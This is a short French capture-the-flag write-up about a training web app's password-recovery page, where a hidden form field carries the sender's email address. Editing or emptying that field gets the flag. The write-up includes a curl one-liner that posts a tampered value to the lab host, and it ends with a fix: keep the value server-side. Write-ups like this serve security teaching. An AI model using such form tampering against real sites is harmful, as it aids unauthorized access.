# Exploit 07 - Invalid POST values for recover mail page

Sur la [page de récupération de mot de passe](http://192.168.56.101/index.php?page=recover)
il y a un `input` caché:

```html
<input
        type="hidden"
        name="mail"
        value="webmaster@borntosec.com"
        maxlength="15"
/>
```

il suffit de modifier la `value` de cet `input` et d'envoyer le formulaire pour obtenir le flag.

On peut automatiser la récupération du flag avec la commande:

```bash
curl -s 'http://192.168.56.102/?page=recover#' --data 'mail=&Submit=Submit' | grep -oP 'The flag is : \K[0-9a-f]{64}'
```

L'intention derrière cet input est sûrement de paramétrer l'adresse de l'expéditeur du mail de reinitialisation du mot
de passe. Ce paramètre devrait être présent uniquement sur l'application backend, et idéalement stocké en base de donnée.
